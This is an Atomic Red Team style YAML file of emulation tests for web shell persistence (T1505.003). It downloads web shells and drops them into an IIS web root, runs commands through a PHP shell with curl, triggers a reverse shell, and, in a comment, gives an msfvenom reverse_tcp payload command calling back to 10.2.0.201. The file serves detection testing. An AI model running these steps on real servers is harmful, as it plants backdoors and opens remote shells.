attack_technique: T1505.003
display_name: 'Server Software Component: Web Shell'
atomic_tests:
- name: Web Shell Written to Disk
  auto_generated_guid: 0a2ce662-1efa-496f-a472-2fe7b080db16
  description: |
    This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.
    Idea from APTSimulator.
    cmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
  supported_platforms:
  - windows
  input_arguments:
    web_shell_path:
      description: The path to drop the web shell
      type: string
      default: C:\inetpub\wwwroot
    web_shells:
      description: Path of Web Shell
      type: path
      default: PathToAtomicsFolder\T1505.003\src
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Web shell must exist on disk at specified location (#{web_shells})
    prereq_command: |
      if (Test-Path "#{web_shells}") {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory "#{web_shells}" -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/tests.jsp"
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
  executor:
    command: |
      xcopy /I /Y "#{web_shells}" #{web_shell_path}
    cleanup_command: |
      del #{web_shell_path}\b.jsp /q >nul 2>&1
      del #{web_shell_path}\tests.jsp /q >nul 2>&1
      del #{web_shell_path}\cmd.aspx /q >nul 2>&1
    name: command_prompt
- name: Invoke Web Shell in Dockerized PHP Server
  auto_generated_guid: 98765432-dcba-4321-fe00-1234567890ab
  description: |
    Starts a PHP server using Docker, copies a web shell into it, invokes the web shell to achieve remote code execution (RCE), and then stops the container.
  supported_platforms:
    - linux
  dependencies:
    - description: |
        Requires Docker to be installed and the user to have permissions to use Docker.
      prereq_command: |
        type docker
      get_prereq_command: |
        echo "Install Docker from https://docs.docker.com/get-docker/"
  input_arguments:
    web_shell:
      description: Path to shell
      type: path
      default: PathToAtomicsFolder/T1505.003/src/shell.php
    web_shell_cmd:
      description: The command to execute from web shell
      type: string
      default: sh -c 'echo T1505.003 - hello from webshell'
  dependency_executor_name: bash
  executor:
    name: bash
    elevation_required: false
    command: |
      mkdir -p /tmp/t1505_003

      docker stop t1505_003_container 2>/dev/null || : 
      # TODO: build image locally
      docker run --rm --name t1505_003_container -d -p 127.0.0.1:8080:80 -v "/tmp/t1505_003:/htdocs" eriksoderblom/alpine-apache-php:24.01
      
      # Wait for PHP server to get ready
      sleep 3
    
      # Simulate web shell dropping
      cp #{web_shell} /tmp/t1505_003/shell.php

      # Host can be configured via HTTP_SERVER_NAME / HTTPS_SERVER_NAME
      # See details at https://github.com/eriksoderblom/alpine-apache-php
      curl http://127.0.0.1:8080/shell.php -H 'Host: www.example.com' \
        -G --data-urlencode "cmd=#{web_shell_cmd}"


      docker stop t1505_003_container
    cleanup_command: |
      rm -r /tmp/t1505_003
      docker rmi eriksoderblom/alpine-apache-php:24.01

- name: Invoke Reverse Shell in Dockerized PHP Server
  auto_generated_guid: d526961d-dc60-42d8-a2a4-1a007819f98e
  description: |
    Starts a PHP server using Docker, copies a reverse shell into it, invokes request to achieve remote code execution (RCE), and then stops the container.
  supported_platforms:
    - linux
  dependencies:
    - description: |
        Requires Docker and docker-compose to be installed and the user to have permissions to use Docker.
      prereq_command: |
        which docker && which docker-compose
      get_prereq_command: |
        apt install docker.io docker-compose || echo "Install Docker from https://docs.docker.com/get-docker/"

  input_arguments:
    web_shell:
      description: Path to reverse Web Shell
      type: path
      default: PathToAtomicsFolder/T1505.003/src/revshell.php
    docker_compose_file:
      description: Path to docker-compose file for emulation
      type: path
      default: PathToAtomicsFolder/T1505.003/src/docker-compose.yml
  dependency_executor_name: bash
  executor:
    name: bash
    elevation_required: false
    command: |
      mkdir -p /tmp/t1505_003
      docker-compose -f #{docker_compose_file} up -d

      # Wait for PHP server to get ready
      sleep 2
    
      # Simulate web shell dropping
      cp #{web_shell} /tmp/t1505_003/revshell.php

      curl http://127.0.0.1:8080/revshell.php -H 'Host: www.example.com'

      sleep 1

      docker-compose -f #{docker_compose_file} down
    cleanup_command: |
      rm -r /tmp/t1505_003 2>/dev/null
      docker rmi eriksoderblom/alpine-apache-php:24.01

- name: Meterpreter Reverse Shell in Docker
  auto_generated_guid: 4d9ce5ea-a34d-45c8-8d8a-8b7fd75d7790
  description: |
    This test simulates an attacker using Metasploit to handle a reverse shell from a Docker container acting as a victim.
    The test automates the process of setting up attacker and victim environments using tmux, runs payloads, and handles responses.
  supported_platforms:
    - linux
  input_arguments:
    test_src:
      description: Path to the test source folder
      type: path
      default: PathToAtomicsFolder/T1505.003/src/msf
    payload:
      description: Reverse shell payload to use
      type: path
      default: /tmp/payloads/shell-x86.elf
  dependency_executor_name: bash
  executor:
    name: "bash"
    command: |
      cd #{test_src} 
      PAYLOAD=#{payload} ./invoke_test.sh
  dependencies:
    - description: "Ensure Docker and Metasploit are installed and configured properly."
    - description: "Ensure tmux is installed on the host."
  cleanup_command: |- 
    rm -r #{test_src}/payloads/.msf4 || :
    rm /tmp/meterpreter_session.log || : 
# To generate payload, inside msf folder run
# ./bin/msfvenom -p linux/x86/shell/reverse_tcp  lhost=10.2.0.201 lport=4444 -f elf -o /home/msf/shell-x86.elf
- name: Meterpreter Staged Reverse Shell in Docker
  auto_generated_guid: 7a20d6c8-93d3-48f4-b520-7b68481bbb48
  description: |
    This test simulates an attacker using Metasploit to handle a staged reverse shell from a Docker container acting as a victim.
  supported_platforms:
    - linux
  input_arguments:
    test_src:
      description: Path to the test source folder
      type: path
      default: PathToAtomicsFolder/T1505.003/src/msf
    payload:
      description: Reverse shell payload to use
      type: path
      default: /tmp/payloads/shell-x86-staged.elf
  dependency_executor_name: bash
  executor:
    name: "bash"
    command: |
      cd #{test_src} 
      PAYLOAD=#{payload} ./invoke_test.sh
  dependencies:
    - description: "Ensure Docker and Metasploit are installed and configured properly."
    - description: "Ensure tmux is installed on the host."
  cleanup_command: |- 
    rm -r #{test_src}/payloads/.msf4 || :
    rm /tmp/meterpreter_session.log || : 
